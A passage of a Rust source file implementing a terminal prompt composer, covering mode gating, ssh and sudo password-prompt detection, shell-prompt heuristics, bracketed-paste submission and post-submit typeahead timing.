//! P3 Composer v1: a native prompt editor drawn at the bottom of the
//! terminal card, active only when the shell is demonstrably at an
//! interactive prompt (spec: docs\p3-composer-v1-spec.md).
//!
//! While composing, ZERO bytes reach the PTY per keystroke. The only bytes
//! this module ever writes are user-intended input: the submission (paste
//! semantics + `\r`), the bare `\r` prompt refresh, and — on explicit click
//! into a dirty prompt only — one Ctrl+C clear chord. Prompt detection is
//! pure observation of the hook events P2's scanner already produces
//! (mirror/parser purity, inv. 1).
//!
//! The strip is a CONSTANT 36px reservation for hooked terminals only: grid
//! geometry never depends on transient shell state (inv. 5, resize-storm
//! incident class), and hookless sessions (`epoch == 0`) never allocate a
//! `ComposerState` at all (inv. 2).

use std::collections::VecDeque;
use std::time::{Duration, Instant};

use alacritty_terminal::term::TermMode;
use egui::{
    Align2, Color32, CornerRadius, FontId, Id, Key, Modifiers, Pos2, Rect, Sense, Stroke,
    StrokeKind, Ui, Vec2,
};
use uuid::Uuid;

use super::complete;
use super::term_backend::{Reclaim, TermBackend};
use crate::state::BlockRec;

/// Constant bottom-strip reservation per hooked terminal (D1).
pub const STRIP_H: f32 = 36.0;
/// Beyond this many draft lines the upward editor scrolls internally.
const EDITOR_MAX_ROWS: usize = 8;
/// Settle debounce after a `pre` latch before auto-arming. ZERO: the headline
/// UX is that a user typing the instant a prompt returns lands in the
/// composer — ANY delay loses that race to the grid (the first key falls
/// through raw → `episode_used` → ManualOnly for the whole episode: the
/// confirmed root cause of "typing goes raw at a fresh prompt"). Rapid
/// re-prompts (cls/command bursts) are handled by re-latching per `pre` (arm
/// stays stable, idempotent) and the stray-text guard is `cursor_clean`
/// (grid observation), not a timer — so a fast typist never loses the race
/// yet type-ahead still can't arm over echoed text.
const SETTLE: Duration = Duration::ZERO;
/// Presentational SubmitHold cap (render-bugs pass, Bug 1b — was 250ms):
/// never paint the just-submitted ghost over a stale grid row longer than
/// this, even if the echo never becomes observable in the grid. The old
/// 250ms cap force-released the hold when a machine hitch delayed the shell
/// echo — and since release is the ONLY history-cover conversion point, the
/// late echo then rendered as a raw `PS …> cmd` row FOREVER (the "history
/// rows inconsistently styled" class). Release between submit and this bound
/// belongs to grid observation alone (`echo_landed`); the bound only exists
/// for a shell that truly ate the input (honest bare row restored).
const SUBMIT_HOLD_MAX: Duration = Duration::from_millis(1500);
/// Freshness cap on the prompt-render-window blank (Bug 2): the incoming
/// prompt row is only blanked this long after the `pre` latch — if the
/// 133;B never arrives (lost hook), the raw prompt resurfaces long before
/// the DEMOTE clock would step Compose down.
const INCOMING_COVER_CAP: Duration = Duration::from_millis(500);
/// Strip hysteresis (stable-chrome): the left lane stays FROZEN QUIET for
/// this long after a submit/exec/prompt edge before revealing Busy content
/// or the raw label — instant commands (`ls` round-trips in 30-120ms) never
/// flash the strip through busy/label states. Just under reaction time.
const REVEAL: Duration = Duration::from_millis(180);
/// Bug C/C2 (full-screen apps get the whole card): once the alt screen has
/// been held continuously this long, the strip COLLAPSES — the label +
/// right cluster stop painting AND the 36px reservation is handed to the
/// grid (`layout_for` consults the same `strip_hidden` predicate, so the
/// terminal gains the rows and the PTY resizes once). Every affordance is
/// already inert under alt, so the band is genuinely dead chrome there.
/// This delay is ALSO the resize debounce: alt flapping (claude shelling
/// out, startup blips, `less` on a short file) can never storm PTY resizes
/// — re-collapse needs a fresh 400ms of stable alt, so a flap cycle costs
/// at most two resizes per ~800ms, all routed through the ordinary
/// resize_to/no-op machinery. The return on any lane change is instant,
/// same frame (the strip must be back the moment a prompt exists). The
/// under-alt resize is safe since the C2 term_backend change: the alt
/// pre_resize path drops chrome recoverably (never stales the feed) and the
/// shell's next prompt re-primes block recording.
const HIDE_AFTER: Duration = Duration::from_millis(400);

/// How long an active Compose may sit with its cover certainty broken
/// (prompt latch gone or the grid cursor off the captured prompt end, no
/// SubmitHold bridging) before it demotes to Raw (restored-render fix).
/// Long enough to ride out every legitimate transient — the manual-activate
/// clear-chord round-trip (~150-250ms to a fresh prompt), the pre→133;B
/// render gap, a conhost resize repaint — short enough that the broken
/// steady state (armed hint lane + a raw prompt row with its own cursor,
/// indefinitely, on an idle restored session) can't establish itself.
const DEMOTE: Duration = Duration::from_millis(750);

/// Held-Enter spacing (restored-render fix, scope #3): empty-Enter gestures
/// queue instead of dispatching per keypress, and at most this many spacers
/// may sit in a row at the queue's tail — a shell can only render prompts so
/// fast, so excess key-repeats coalesce instead of flooding `\r` (the field
/// failure: holding Enter blew through the composer into raw prompt spam and
/// a blanked-void grid).
const SPACER_QUEUE_CAP: usize = 3;

/// Post-submit typeahead window (the fast-typing fix): after a composer
/// submission, if the fresh `pre` has NOT come back within this long, the
/// submitted command is long-running and the WINDOW closes — since the
/// permanent-editor fix the composer STAYS Compose (the old behavior here,
/// flushing the buffer raw and yielding Raw(Busy), was the measured re-arm
/// gap: the editor was hidden for the whole command minus 300ms, and slow
/// ssh links blinked it on every submit). Typing keeps buffering visibly in
/// the draft; queued Enters dispatch at the next provably-clean prompt via
/// `pump_pending`. Only the all-spacer abandon rule still fires at this
/// threshold (held-Enter contract). Tunable. (A SubmitHold ghost MAY
/// outlive this window since Bug 1b: an echo delayed past it keeps the hold
/// pinned — the honest reading of "submitted, not yet echoed".)
const POST_SUBMIT_FLUSH: Duration = Duration::from_millis(300);

/// A post-submit window whose resolution tick arrives this much later than
/// dispatch (the terminal was deselected / the GUI occluded — tick paused)
/// must never fire the buffered bytes: the moment has passed. The buffer is
/// folded into the visible draft instead, and the user re-confirms.
const WINDOW_STALE: Duration = Duration::from_millis(2000);

/// Hard cap on blind-queued submissions. Beyond it, Enter falls back to the
/// visible-buffering newline (fusion guard) instead of growing the queue.
const PENDING_CAP: usize = 16;

/// D2 heuristic prompt latch: output must have been quiet this long with the
/// cursor parked after a prompt-shaped row before the latch mints. Above
/// REVEAL (180ms) so the strip never flashes through the arm, and matching
/// the daemon's own CMD_QUIET precedent (`cmd_prompt_evidence`).
const HEUR_QUIET: Duration = Duration::from_millis(300);

/// D2: the post-submit window-close threshold DURING a heuristic episode.
/// Resolution (c)'s "shell is back at a prompt" signal is a fresh heuristic
/// latch, which structurally takes echo + output + the 300ms quiet window
/// (≈400-500ms for instant commands) — the integrated 300ms threshold would
/// always close too early. Since the permanent-editor fix this threshold
/// only CLOSES the window (Compose held, draft + queue keep buffering
/// visibly; the old raw flush is gone on this lane too).
const HEUR_FLUSH: Duration = Duration::from_millis(1000);

/// Per-terminal composer mode. Raw is the default and the fallback.
#[derive(Clone, Copy, PartialEq, Debug)]
pub enum ComposerMode {
    /// Editor shown; when it has egui focus, keys land in the draft only.
    Compose,
    /// All keys go to the PTY exactly as today. The reason drives the strip's
    /// label.
    Raw(RawReason),
}

#[derive(Clone, Copy, PartialEq, Debug)]
pub enum RawReason {
    /// Open block (command / TUI running) — strip shows cmd + elapsed.
    Busy,
    /// Full-screen app owns the screen.
    AltScreen,
    /// Hooked but no `at_prompt` latch yet (fresh spawn, cold attach).
    NoPrompt,
    /// User typed raw / clicked the grid at an armed prompt (episode used).
    UserRaw,
    /// Session exited.
    Dead,
    /// SLEEP §7.3: the user shelved this terminal — lane shows `☾ asleep`
    /// with the accent `Wake ▸` in the Run slot. Draft kept for the return.
    Asleep,
}

/// Everything the gate looks at, all existing or feed-time observable (§2.1).
pub struct GateInputs {
    pub hooked: bool,
    pub running: bool,
    pub alt: bool,
    pub mouse: bool,
    pub open_block: bool,
    pub at_prompt: bool,
    pub settled: bool,
    pub cursor_clean: bool,
    pub episode_used: bool,
    /// SLEEP: the persisted asleep flag (covers the Sleeping drain
    /// transient too, where `running` is still true for a moment).
    pub asleep: bool,
}

#[derive(PartialEq, Debug)]
pub enum GateVerdict {
    /// All conditions — take focus, show the editor.
    AutoArm,
    /// Core passes but the cursor is dirty / the episode is used — show the
    /// Compose button only.
    ManualOnly,
    Blocked(RawReason),
}

/// The pure gate function (§2.5) — unit-tested row by row.
pub fn gate(i: &GateInputs) -> GateVerdict {
    if !i.hooked {
        return GateVerdict::Blocked(RawReason::NoPrompt); // strip absent anyway
    }
    // SLEEP: the flag wins over `running` — it covers the Sleeping drain
    // transient (never arm into a world being torn down) AND keeps the
    // per-frame tick from clobbering Raw(Asleep) back to Raw(Dead) once the
    // exit lands (the tick re-derives the mode from this gate every frame).
    if i.asleep {
        return GateVerdict::Blocked(RawReason::Asleep);
    }
    if !i.running {
        return GateVerdict::Blocked(RawReason::Dead);
    }
    if i.alt {
        return GateVerdict::Blocked(RawReason::AltScreen);
    }
    if i.open_block {
        return GateVerdict::Blocked(RawReason::Busy);
    }
    if i.mouse {
        return GateVerdict::Blocked(RawReason::Busy);
    }
    if !i.at_prompt || !i.settled {
        return GateVerdict::Blocked(RawReason::NoPrompt);
    }
    if i.cursor_clean && !i.episode_used {
        GateVerdict::AutoArm
    } else {
        GateVerdict::ManualOnly
    }
}

/// PRE-SHELL raw-conversation state (v0.1.1, the ssh password-phase fix): a
/// hooked terminal whose CURRENT lifetime has produced no hook event yet
/// (`pre_seen`/`exec_seen` still at their post-Reset origin) and whose
/// prompt latch is not live is talking to something that is NOT the shell —
/// ssh auth (password / host-key), a slow login chain, a dead bootstrap.
/// While pre-shell the composer must never offer `❯ Compose` (no arm
/// affordance, no AutoArm, no cold-attach heuristic): the field failure was
/// the strip inviting a mouse-first user to type their ssh password into a
/// visible plaintext editor. Exit is the first token-checked hook of the
/// lifetime — the same signal ssh auto-reconnect uses as its success
/// witness. No timers, no prompt heuristics (per the A-investigation
/// design): every input is an existing per-lifetime signal.
pub(crate) fn pre_shell(
    running: bool,
    alt: bool,
    pre_seen: u64,
    exec_seen: u64,
    at_prompt_latched: bool,
) -> bool {
    running && !alt && pre_seen == 0 && exec_seen == 0 && !at_prompt_latched
}

/// What the pre-shell conversation is asking RIGHT NOW, read from the grid
/// cursor row's text (render-only — a miss degrades to the generic label,
/// never a wrong cover). Anchored at the END of the row text (trim-end'd),
/// mirroring `(?i)(password|passphrase|passcode)[^:]*:\s*$` and
/// `\(yes/no(/\[fingerprint\])?\)\?\s*$` without a regex dependency.
#[derive(Clone, Copy, PartialEq, Debug)]
pub(crate) enum AuthPrompt {
    /// `…password:` / `Enter passphrase for key '…':` — echo is off; keys go
    /// straight to ssh.
    Password,
    /// `…(yes/no/[fingerprint])?` — the host-key confirmation.
    HostKey,
    None,
}

pub(crate) fn detect_auth_prompt(row: &str) -> AuthPrompt {
    let t = row.trim_end();
    if t.ends_with("(yes/no)?") || t.ends_with("(yes/no/[fingerprint])?") {
        return AuthPrompt::HostKey;
    }
    if let Some(body) = t.strip_suffix(':') {
        let lower = body.to_lowercase();
        for kw in ["password", "passphrase", "passcode"] {
            if let Some(i) = lower.rfind(kw) {
                // The keyword's run must reach the colon with no earlier
                // colon in between (the `[^:]*:` tail of the pattern).
                if !lower[i + kw.len()..].contains(':') {
                    return AuthPrompt::Password;
                }
            }
        }
    }
    AuthPrompt::None
}

/// Bug D (`sudo su` composer honesty): does this open block's command spawn
/// a NESTED INTERACTIVE SHELL? The block rec stays open for the whole
/// episode and nothing is "running" — the user is at a raw shell; this
/// classifier picks the honest lane over the forever-counting Busy row.
/// Render-only here and conservative by design: a false negative degrades to
/// today's Busy row, a false positive still shows a true statement ("typing
/// goes to the terminal"). The gate and cover never read it. The classifier
/// BODY moved to `daemon::tracker` (F1: the daemon applies the same verdict
/// in `track_hook_exec` to start the nested-chain breadcrumb) — re-exported
/// so every composer/probe call site keeps its spelling and the truth-table
/// test below pins the shared implementation.
pub(crate) use crate::daemon::tracker::nested_shell_cmd;

/// Which line the honest raw-shell lane shows, read from the grid CURSOR row
/// only (render-only, same contract as the pre-shell labels: a miss degrades
/// to the generic line, never a wrong cover — and `Password:` text sitting
/// in mid-scrollback output can never select the lock line because it is
/// simply never passed in).
#[derive(Clone, Copy, PartialEq, Debug)]
pub(crate) enum NestedShellLine {
    /// `[sudo] password for alice:` / `Password:` at the cursor — echo is
    /// off; keys go straight to the shell.
    Password,
    /// The generic honest statement: no integration here, typing is raw.
    Generic,
}

pub(crate) fn nested_shell_line(cursor_row: &str) -> NestedShellLine {
    if detect_auth_prompt(cursor_row) == AuthPrompt::Password {
        NestedShellLine::Password
    } else {
        NestedShellLine::Generic
    }
}

/// PERMANENT-EDITOR exception (the one auto-yield left): a RUNNING command
/// asking a question on the primary screen — `password:` / passphrase (git
/// credential, sudo, ssh inside a script), `(yes/no)?` host-key checks, and
/// apt/pacman-style `(y/n)` / `[Y/n]` confirms — must get the keys, so the
/// busy-Compose editor steps aside for it. Cursor-row-anchored and
/// render-only like `detect_auth_prompt`/`nested_shell_line` (which it
/// reuses): a false negative degrades to the click-to-grid escape hatch, a
/// false positive degrades to the old always-yield busy behavior — both are
/// exactly yesterday's UX, never a wrong cover.
pub(crate) fn inline_interactive_prompt(cursor_row: &str) -> bool {
    if detect_auth_prompt(cursor_row) != AuthPrompt::None {
        return true;
    }
    let t = cursor_row.trim_end().to_ascii_lowercase();
    // End-anchored y/n confirm shapes (mirroring the auth classifier's
    // suffix discipline — mid-row "password" text can never match).
    [
        "(y/n)?", "(y/n)", "(y/n):", "[y/n]", "[y/n]?", "[y/n]:",
    ]
    .iter()
    .any(|suf| t.ends_with(suf))
}

/// D2: grid-observed shell-prompt shape at the cursor (the heuristic
/// composer's arm signal in markerless nested shells — validated against 20
/// real captured prompt shapes and 17 adversarial negatives in the D2
/// research's docker rig). `prefix` is `cursor_prefix_gap().0` (cells LEFT
/// of the cursor, trim-end'd); `col_gap` = cursor col − rendered prefix
/// length (a prompt's trailing space ⇒ 1; 0 for no-space prompts; >2 ⇒ the
/// cursor was parked away from the text — not a prompt tail).
///
/// The input contract gives the dirty check for free: typed text after the
/// sigil ends the prefix with a non-sigil char → no match → no arm. This
/// classifier IS the cursor_clean check in heuristic mode. Documented
/// residual: zsh's PS2 (`quote> `) classifies as a prompt — typing there
/// goes into the continuation, functionally where raw typing would go
/// (record mislabel only).
pub(crate) fn looks_like_shell_prompt(prefix: &str, col_gap: usize) -> bool {
    let t = prefix.trim_end();
    if t.is_empty() {
        return false;
    }
    // The cursor must sit ON or just past the text (prompt trailing space).
    if col_gap > 2 {
        return false;
    }
    // Leading-glyph prompts (oh-my-zsh robbyrussell `➜  ~`, pure/starship
    // multiline tails start the row with the glyph and may END with a dir).
    if t.starts_with('\u{279c}') || t.starts_with('\u{276f}') {
        return true;
    }
    let Some(last) = t.chars().last() else {
        return false;
    };
    match last {
        '$' | '#' | '\u{276f}' | '\u{3009}' => true,
        // zsh `%` — but never a percentage tail (`100%`, `45%`).
        '%' => !t
            .chars()
            .rev()
            .nth(1)
            .is_some_and(|c| c.is_ascii_digit()),
        // fish/pwsh/nushell/cmd `>` — but never bash/zsh PS2 (a bare `>`
        // continuation row) and never an echoed `>>` redirect tail.
        '>' => t != ">" && !t.ends_with(">>"),
        // Everything else — colons (every password/passphrase prompt), `?`,
        // `]`, plain words — refuses.
        _ => false,
    }
}

/// D2: best-effort cwd parsed from the PROMPT TEXT itself (display only —
/// never persisted, never fed to completion). Handles the two dominant
/// shapes: `user@host:path$ ` (the segment between the last `:` and the
/// sigil, `@` required before the colon so `C:\…>` never parses) and the
/// RHEL `[user@host dir]# ` bracket form (the last space-separated token).
/// A miss returns None — the lane shows the bare sigil chip.
pub(crate) fn heur_prompt_cwd(prefix: &str) -> Option<String> {
    let t = prefix
        .trim_end()
        .strip_suffix(['$', '#', '%', '>', '\u{276f}', '\u{3009}'])?
        .trim_end();
    if let Some(stripped) = t.strip_suffix(']') {
        let inner = stripped.rsplit('[').next().unwrap_or(stripped);
        let dir = inner.rsplit(' ').next()?.trim();
        return (!dir.is_empty()).then(|| dir.to_string());
    }
    let at = t.find('@')?;
    let colon = t.rfind(':')?;
    if colon <= at {
        return None;
    }
    let dir = t[colon + 1..].trim();
    (!dir.is_empty()).then(|| dir.to_string())
}

/// Submission encoding (§4.1): byte-identical to paste-then-Enter. Bracketed
/// iff the shell requested DECSET 2004 (PSReadLine 2.0 on PS 5.1 never does —
/// unconditional brackets would leak literal `ESC[200~` into its buffer);
/// the accept `\r` goes OUTSIDE the brackets. An empty draft submits a bare
/// `\r` (prompt refresh, block-silent — §13.6).
pub fn submission_bytes(backend: &TermBackend, draft: &str) -> Vec<u8> {
    let text = draft.trim_end(); // a trailing \n would double-submit on 5.1
    // r2-F2: drafts can carry pasted content — strip controls so a literal
    // `ESC[201~` can never close the bracket early and execute the rest.
    let text = crate::strip::sanitize_paste(text);
    let sanitized = text.replace("\r\n", "\r").replace('\n', "\r");
    let mut out = Vec::with_capacity(sanitized.len() + 16);
    if !sanitized.is_empty() && backend.mode().contains(TermMode::BRACKETED_PASTE) {
        out.extend_from_slice(b"\x1b[200~");
        out.extend_from_slice(sanitized.as_bytes());
        out.extend_from_slice(b"\x1b[201~");
    } else {
        out.extend_from_slice(sanitized.as_bytes());
    }
    out.push(b'\r'); // accept-line, OUTSIDE the brackets
    out
}

/// What a plain Enter in the editor does (the FUSION GUARD + the typeahead
/// routing rule, pure so both are pinned by test): submit when armable;
/// QUEUE a pending submission while the post-submit typeahead buffer is
/// engaged (blind `cmd1⏎cmd2⏎cmd3⏎` executes as sequential clean blocks,
/// one command per prompt cycle); insert a line break when un-armable with a
/// draft outside the buffer (the TextEdit takes the key natively — the draft
/// visibly holds both commands as separate lines and submission encodes each
/// as its own `\r`, so two commands can never silently fuse); swallow when
/// un-armable and empty (a newline would just grow the editor).
#[derive(PartialEq, Debug, Clone, Copy)]
pub(crate) enum EnterAction {
    Submit,
    /// Post-submit buffering: the draft becomes a queued submission (or a
    /// queued spacer when empty), dispatched one-per-prompt-cycle by
    /// `pump_pending`.
    Queue,
    InsertNewline,
    Swallow,
}

pub(crate) fn enter_action(can_submit: bool, has_draft: bool, buffering: bool) -> EnterAction {
    if can_submit {
        EnterAction::Submit
    } else if buffering {
        EnterAction::Queue
    } else if has_draft {
        EnterAction::InsertNewline
    } else {
        EnterAction::Swallow
    }
}

/// Buffered text as the raw KEYSTROKES the user effectively typed: UTF-8
/// passthrough with every newline as `\r` (Enter). Used by the typeahead
/// flush — never bracketed (these emulate typing, not a paste).
fn keystroke_bytes(s: &str) -> String {
    s.replace("\r\n", "\r").replace('\n', "\r")
}

/// Clipboard → draft normalization (Bug E): CRLF/CR become LF, control
/// characters strip (same policy as submission's sanitize_paste), and
/// TRAILING newlines trim — a copied line's trailing \n must not flip the
/// lane editor into the upward multi-line popup. Interior newlines are
/// preserved (real multi-line pastes still grow the editor upward).
pub(crate) fn normalize_paste_text(s: &str) -> String {
    let s = crate::strip::sanitize_paste(s); // keeps \r \n \t, strips ESC/C0/C1
    s.replace("\r\n", "\n")
        .replace('\r', "\n")
        .trim_end_matches('\n')
        .to_string()
}

/// How many rows the draft editor needs (Bug E belt): rows come from the
/// TRIMMED content so a trailing-newline-only draft can never open the
/// upward popup even if a future entry point forgets to normalize. The
/// draft content itself is untouched.
pub(crate) fn editor_rows(draft: &str) -> usize {
    draft.trim_end_matches('\n').split('\n').count().max(1)
}

/// The click-gated clear chord (§4.2): Ctrl+C = PSReadLine `CancelLine`, the
/// only edit-mode-independent line-kill (Escape is a meta prefix in Emacs
/// mode and enters command mode in Vi mode — catastrophic before a paste).
/// Sent ONLY on explicit user activation over a provably-dirty prompt.
/// Also the busy INTERRUPT chord for every family (^C cancels a running
/// command on cmd too — the per-family split is line-CLEAR only, D15).
fn clear_chord(backend: &TermBackend) -> Vec<u8> {
    if backend.win32_input {
        if let Some(seq) = crate::win32_input::encode_key(Key::C, Modifiers::CTRL) {
            return seq;
        }
    }
    vec![0x03]
}

/// Per-family line-clear for `activate()` over a dirty prompt (P6b §6/D15):
/// **ESC for cmd** — cmd's line editor clears the input in place, no `^C`
/// splatter, no new prompt needed (cmd's prompt latch was never cleared by
/// an exec hook, so there is nothing to re-latch); Ctrl+C everywhere else
/// (readline-safe, edit-mode-independent).
fn line_clear_chord(backend: &TermBackend, is_cmd: bool) -> Vec<u8> {
    if !is_cmd {
        return clear_chord(backend);
    }
    if backend.win32_input {
        if let Some(seq) = crate::win32_input::encode_key(Key::Escape, Modifiers::NONE) {
            return seq;
        }
    }
    vec![0x1b]
}

/// Whether an outgoing raw-input blob carries an Enter press — the trigger
/// for the P6b observed-raw capture (a cmd command typed in Raw mode gets a
/// record-only `SubmitCommand{write:false}`). VT mode: a literal `\r`.
/// win32-input-mode: a KEY_EVENT record `ESC[Vk;Sc;Uc;Kd;…_` with Vk=13
/// (VK_RETURN) and Kd=1 (key down).
pub(crate) fn bytes_contain_enter(bytes: &[u8], win32: bool) -> bool {
    // A literal `\r` is Enter in BOTH modes: VT-encoded Enter is `\r`, and
    // under mode 9001 plain text (a grid paste) still passes through as
    // UTF-8 where conhost synthesizes the key events — a pasted newline
    // submits either way.
    if bytes.contains(&b'\r') {
        return true;
    }
    if !win32 {
        return false;
    }
    let mut i = 0;
    while let Some(off) = bytes[i..].iter().position(|&b| b == 0x1b) {
        let start = i + off;
        let rest = &bytes[start..];
        if rest.len() > 2 && rest[1] == b'[' {
            if let Some(end) = rest.iter().position(|&b| b == b'_') {
                if let Ok(body) = std::str::from_utf8(&rest[2..end]) {
                    let mut f = body.split(';');
                    let vk = f.next().and_then(|v| v.parse::<u32>().ok());
                    let kd = f.nth(2).and_then(|v| v.parse::<u32>().ok());
                    if vk == Some(13) && kd == Some(1) {
                        return true;
                    }
                }
                i = start + end + 1;
                continue;
            }
        }
        i = start + 1;
    }
    false
}

/// The post-submit typeahead window: live from a composer submission until
/// the fresh `pre` re-latch, an interactivity flip (alt/mouse), or the
/// POST_SUBMIT_FLUSH threshold. While it is live the composer STAYS in
/// Compose with the editor focused: every key routes into the draft, NEVER
/// raw to the PTY — the submit→re-arm gap is exactly where fast typing used
/// to fall through and echo at the shell (raw `PS …>` prompts, visible `^C`
/// reclaim churn, stranded fragments).
#[derive(Clone, Copy)]
struct SubmitWindow {
    /// `pre_seen` at dispatch: resolution (c) requires a STRICTLY fresh pre.
    pre0: u64,
    since: Instant,
    /// D2: the submission rode the heuristic (marker-silent nested-shell)
    /// lane — resolution (c) closes on a FRESH heuristic latch instead of a
    /// pre (none can arrive mid-episode), and the flush threshold stretches
    /// to HEUR_FLUSH (a fresh latch takes echo + output + the 300ms quiet).
    heur: bool,
}

/// D2 heuristic prompt latch: live only inside a marker-silent nested-shell
/// episode. The cell is the composer's `prompt_end` surrogate — cover row,
/// SubmitHold column and the clean check all read it. Dropped on ANY
/// output/marker/alt/mouse/resize edge (drop, never drift — the hold_row
/// doctrine).
struct HeurPrompt {
    /// Grid line at mint (shifts with history growth, like `hold_row`).
    line: i32,
    /// Cursor column at mint — where submitted text will start.
    col: usize,
    since: Instant,
    /// history_size at mint: the shift baseline.
    history: usize,
    /// Grid (cols, rows) at mint: a resize reflows rows unpredictably ⇒ drop.
    grid: (u16, u16),
    /// Backend feed generation at mint: ANY parsed byte after the mint bumps
    /// it — the strongest single disarm (prompt-shaped OUTPUT mid-command
    /// tears down the instant more output flows).
    feed_gen: u64,
}

/// Presentational-only handoff after submit (Bug 3): the just-submitted
/// command is painted read-only on the covered prompt row (and frozen in the
/// lane while the draft is empty) until the grid underneath catches up, so
/// the Enter keypress causes ZERO visual change. Input routing stays in the
/// editor (post-submit typeahead buffering); this state paints nothing to
/// the PTY.
struct SubmitHold {
    /// The trimmed draft text as the user last saw it.
    ghost: String,
    /// Grid line the cover occupied AT SUBMIT — the pin. Rendered (and
    /// released, and converted) at `hold_row`: this line shifted by exactly
    /// the history growth since submit, the same drop-don't-drift rule
    /// anchors and covers follow. NEVER re-read from a live prompt_end.
    line: i32,
    /// Grid column where the echo text will start (the captured prompt-end
    /// col at submit) — where `echo_landed` reads the row's cells.
    col: usize,
    /// Dimmed cwd painted in the hold ghost — carried into the permanent
    /// history cover on release so the hold→history swap is pixel-zero.
    cwd: Option<String>,
    since: Instant,
    /// history_size at submit: the shift baseline for `hold_row`.
    history: usize,
    /// Grid (cols, rows) at submit: a resize reflows rows unpredictably, so
    /// any change drops the pin (honest raw row instead of a drifted cover).
    grid: (u16, u16),
}

/// The hold's pinned row in the CURRENT grid's coordinates: the submit-time
/// row shifted by the history growth since submit — exactly how anchors and
/// presentational covers ride the scroll. `None` = the pin is no longer
/// maintainable (history shrank via ED3/clear, the grid was resized, or the
/// row fell off the ring): release, never drift. The un-shifted `h.line` was
/// the third submit-flicker mechanism — after a scroll it pointed rows BELOW
/// the real echo (often the NEXT `PS …>` prompt row), so the release check
/// read the wrong row and the history-cover conversion landed the `❯ cmd`
/// styling on the wrong line (or silently failed, dropping the covered row
/// back to raw mid-transition).
fn hold_row(h: &SubmitHold, backend: &TermBackend) -> Option<i32> {
    if (backend.size.cols, backend.size.rows) != h.grid {
        return None;
    }
    let hist = backend.history_size();
    if hist < h.history {
        return None;
    }
    let line = h.line - (hist - h.history) as i32;
    (line >= -(hist as i32)).then_some(line)
}

/// Whether the hold may still be alive at `now` (Bug 1b): until the hard
/// bound, yes — the release decision belongs to `echo_landed` alone (text
/// verified, or the cursor left the pinned row: both states where the
/// conversion check reads a settled row). The old 250ms soft cap released a
/// hitch-delayed echo unconverted (release is the ONLY conversion point ⇒
/// permanent raw `PS …> cmd` row), and a cap-release mid-echo-render
/// (partial text on the row) would fail the verify the same way — hence no
/// timer between submit and the bound, and no cursor-motion test either.
/// If the shell truly ate the input (no echo ever), the bound restores the
/// honest bare row.
fn hold_active(h: &SubmitHold, _backend: &TermBackend, now: Instant) -> bool {
    now.duration_since(h.since) < SUBMIT_HOLD_MAX
}

/// GRID truth that the shell echo of the submitted command is visible under
/// the hold's cover — the only safe release signal. The exec-hook counter is
/// NOT one: ConPTY passes OSCs through immediately while conhost renders
/// text on an asynchronous frame (the P2 reorder), so the exec hook for the
/// submitted line routinely arrives in the stream BEFORE the echoed text —
/// releasing on it drops the cover onto a still-bare prompt row (the
/// confirmed "flicker on submit" root cause). Landed = at the SHIFTED pin
/// row, either:
/// - the row's cells show the submitted text (first draft line, compared at
///   the captured prompt-end col), or
/// - the cursor left that row (the accept-newline renders strictly after
///   the echo in the byte stream, so the echo is in the grid).
fn echo_landed(backend: &TermBackend, h: &SubmitHold, row: i32) -> bool {
    if backend.cursor_line() != row {
        return true;
    }
    backend.row_has_text_at(row, h.col, h.ghost.lines().next().unwrap_or(""))
}

/// Where an active recall walk started (P4 §7.2): a plain ArrowUp walk over
/// this terminal's recs, or a cross-session history INSERT whose displaced
/// draft is stashed — ArrowDown-past-newest restores the stash for both (one
/// recall mechanism, two entry gestures).
#[derive(Clone, Copy, PartialEq, Debug)]
pub enum RecallSrc {
    Recs(usize),
    History,
}

/// Ctrl-R fuzzy history search (Warp-study Tier-2b #1): a pre-submit
/// overlay over `state.draft` only — it reads `recs` and writes the draft;
/// the dispatch path (submission_bytes / settled dispatch / covers /
/// SubmitHold / gate) never sees it. While open, the composer's OWN editor
/// is the query field (the draft is stashed and the lane shows the query —
/// readline's reverse-i-search model, so focus never moves and the
/// overlay-close focus contract is trivially the §12.11 one). Results are
/// derived per frame from `recs` + the live query, never stored.
pub struct HistSearch {
    /// Selected row: an index into THIS frame's ranked results (0 = best,
    /// painted at the bottom, adjacent to the query). Clamped by the
    /// renderer when the list shrinks under it.
    pub sel: usize,
    /// The draft as it stood at Ctrl-R — the Esc-restore stash (the same
    /// contract as the recall stash: close-without-accept restores it
    /// EXACTLY; accept displaces it into the recall slot via
    /// `insert_history` so ArrowDown still brings it back).
    saved: String,
}

pub struct ComposerState {
    pub mode: ComposerMode,
    pub draft: String,
    /// This terminal's shell family is Cmd (P6b — set once by the app from
    /// the meta-derived ShellFamily). Routes submissions through the
    /// `SubmitCommand` ledger instead of PTY bytes (cmd has no exec hook, so
    /// the daemon can't otherwise record blocks), swaps the dirty-prompt
    /// line-clear chord to ESC (D15), and refuses multi-line submission
    /// (cmd runs one line at a time — §6).
    pub is_cmd: bool,
    /// Tab completion (#24): this terminal's completion family — path
    /// namespace + quoting rules. Stamped with `is_cmd` at composer creation
    /// (static per terminal: derives from the persisted program+args).
    pub fam: complete::Family,
    /// Live Tab-completion cycle (#24). Authoritative ONLY while the draft
    /// is byte-identical to what the cycle last produced — any other edit
    /// (typing, recall, submit, reclaim, insert) commits the shown candidate
    /// by invalidating the cycle lazily at the next Tab/Esc.
    tab: Option<complete::TabCycle>,
    /// SLEEP §7.3: the terminal's persisted asleep flag, stamped by the app
    /// from every Snapshot (and at composer creation). Drives the gate's
    /// Blocked(Asleep), on_exited's reason pick, and the `☾ asleep` +
    /// `Wake ▸` lane. Draft is KEPT through sleep (the on_exited contract).
    pub asleep: bool,
    /// This terminal's shell family is Ssh (v0.1.1 pre-shell state): gates
    /// the raw-conversation strip labels ("ssh is asking…", the password
    /// lock line) — the pre-shell ARM VETO applies to every family, but the
    /// conversational labels only make sense where a real auth phase exists.
    /// Stamped with `is_cmd` at composer creation (static per terminal).
    pub is_ssh: bool,
    /// SSH auto-reconnect supervision is active (persisted flag riding every
    /// Snapshot, stamped like `asleep`). Drives the `reconnecting…` lane +
    /// the Cancel affordance in the Run slot. Draft kept throughout.
    pub reconnecting: bool,
    /// F1 (ssh-reestablish): the MANUAL retry ladder's progress, stamped
    /// from every Snapshot beside `reconnecting`. attempts fired so far
    /// (0 = auto lane — the plain "reconnecting…" label) and seconds until
    /// the next attempt (0 = in flight). Feed `retry_lane_label`.
    pub retry_attempt: u32,
    pub retry_next_s: u32,
    /// What a Restore re-runs, humanized (dead-relaunch fix a): program and
    /// destination for a program terminal — `ssh 192.168.50.239` — or None
    /// for a plain shell. Feeds `relaunch_label`'s SessionEnded lane text
    /// (`Press Enter to relaunch — ssh <host>`). Stamped with `is_ssh` at
